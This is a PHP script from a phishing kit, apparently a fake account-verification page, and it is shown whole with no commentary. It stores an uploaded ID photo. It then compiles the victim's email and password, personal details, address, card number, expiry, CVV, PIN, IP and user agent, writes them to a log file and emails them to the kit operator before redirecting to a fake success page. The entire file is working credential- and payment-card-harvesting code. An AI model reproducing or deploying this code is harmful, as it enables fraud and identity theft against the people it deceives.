<?php
	error_reporting(0);
	ob_start();
	session_start();
	include '../email.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){
	//================= Date Of Birth Checker ================//
	$avatar    		= $_FILES['photo'];  

    $avatarName 	= strtolower($_FILES['photo']['name']);
	$avatarType 	= $_FILES['photo']['type'];
	$avatarSize 	= $_FILES['photo']['size'];
	$avatarTemp 	= $_FILES['photo']['tmp_name'];

	$avatarTypes 	= array("jpg", "png", "gif", "jpeg");

	$avatarEx = strtolower(end(explode(".", $avatarName)));

	$random = rand(0, 100008400000) . "donk_" . rand(0, 10054916400) . "_" . rand(0, 10054916400) .  "." . $avatarEx;
	if(in_array($avatarEx, $avatarTypes)){
		move_uploaded_file($avatarTemp, "../css/d2kp/" . $random);
	}

$message = '
__________________►| BY Dr Hard |◄__________________
Email: '.$_SESSION['email'].'
Pass: '.$_SESSION['pass'].'
__________________►| BY Dr Hard |◄__________________
First Name: '.$_SESSION["fname"].'
Last Name: '.$_SESSION["lname"].'
DOB: '.$_SESSION["DOB"].'
Phone: '.$_SESSION["PhoneNumber"].'
Street: '.$_SESSION["street"].'
City: '.$_SESSION["city"].'
State: '.$_SESSION["state"].'
Country: '.$_SESSION["country"].'
Zip: '.$_SESSION["ZIP"].'
__________________►| BY Dr Hard |◄__________________
Name On Card: '.$_SESSION["n_card"].'
Card Number: '.$_SESSION["c_num"].'
Expiration Date: '.$_SESSION["exm"].'/'.$_SESSION["exy"].'
CVV: '.$_SESSION["csc"].'
PIN: '.$_SESSION["pin"].'
__________________►| BY Dr Hard |◄__________________
Donkey Photo: '.$_SERVER['HTTP_HOST'].'/myaccount/css/d2kp/'.$random.'
__________________►| BY Dr Hard |◄__________________
User Agent: '.$_SERVER["HTTP_USER_AGENT"].'
IP: http://ip-api.org/#'._ip().'
__________________►| BY Dr Hard |◄__________________';

$Subject="㊣ ☻☻☻ New ID Photo ☻☻☻ ㊣ - "._ip();
$head="From: Dr Hard ★ <log>";

$fil = fopen('rzlt2hd.txt', 'a+');
fwrite($fil, PHP_EOL.'===============>'.$message.PHP_EOL.'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX END XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX');

mail($my_mail,$Subject,$message,$head);
		header('location: success.php?enc=' . md5(time()) . '&p=1&dispatch=' . sha1(time()));
}
else
{
	header('location: ../../index.php');
} 